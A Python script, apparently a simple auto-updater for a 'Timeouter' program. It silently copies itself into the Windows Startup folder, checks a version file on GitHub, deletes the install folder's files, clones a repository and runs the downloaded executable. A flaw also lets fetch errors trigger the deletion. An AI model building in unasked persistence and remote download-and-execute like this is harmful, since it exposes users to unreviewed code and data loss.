import requests
import os
from git import Repo
import sys
import socket
import subprocess
from getpass import getuser
import time 
import shutil
import time
import platform
import traceback

user_name = getuser()
startup = 'C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'.format(user_name)
script_path = sys.argv[0]
destination_path = os.path.join(startup, os.path.basename(script_path))

if not os.path.exists(destination_path):
    shutil.copy(script_path, destination_path)
    print("File copied successfully to startup folder.")
else:
    print("File already exists in the startup folder.")

def handle_error(exception):
  print(f"An error occurred: {exception}")
  exc_type, exc_obj, exc_tb = sys.exc_info()
  fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
  print(f"Error in line: {exc_tb.tb_lineno}")
  
def fetch_data_from_url(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        return response.text.strip()
    except requests.exceptions.RequestException as e:
        print(f"Error fetching data from URL: {e}")
        return None

def needToUpdate(url, file_path):
    url_data = fetch_data_from_url(url)

    if url_data is not None:
        try:
            with open(file_path, 'r') as file:
                file_data = file.read()
                if url_data == file_data.strip():
                    print("Data from URL matches data in the file.")
                    return False
                else:
                    print("Data from URL does not match data in the file.")
                    return True
        except FileNotFoundError:
            print(f"File not found at path: {file_path}")
            return "File Error"
    else:
        print("Unable to fetch data from the URL.")
        return "Fetch Error"

def update(local_path, github_url, exe_path):
    exclude_folders = ['.upm', '.pythonlibs']
    exclude_files = ['.replit', 'pyproject.toml', 'poetry.lock']
    for root, dirs, files in os.walk(local_path, topdown=False):
        for file in files:
            if file not in exclude_files:
                os.remove(os.path.join(root, file))
        for dir in dirs:
            if dir not in exclude_folders:
                os.rmdir(os.path.join(root, dir))
    Repo.clone_from(github_url, local_path)
    print("Update completed successfully!")
    try:
      subprocess.run([exe_path])
      print("Executable file ran successfully.")
    except subprocess.CalledProcessError as e:
      handle_error(e)

program_files_path = os.path.join(os.environ['ProgramFiles'], 'Timeouter')
exe_path = os.path.join(program_files_path, 'main.exe')

url_to_check = "https://raw.githubusercontent.com/syrabrox/Test-Updater/main/version.txt"
file_path_to_check = os.path.join(program_files_path, "version.txt")
checker = needToUpdate(url_to_check, file_path_to_check)
downloadUrl = "https://github.com/syrabrox/Test-Updater.git"

if checker:
  update(program_files_path, downloadUrl, exe_path)#os.getcwd(), downloadUrl, exe_path)
else:
  print(checker)


# if os.path.exists(exe_path):
    # print(f"Path to executable: {exe_path}")
# else:
    # print("Executable not found in the specified path.")
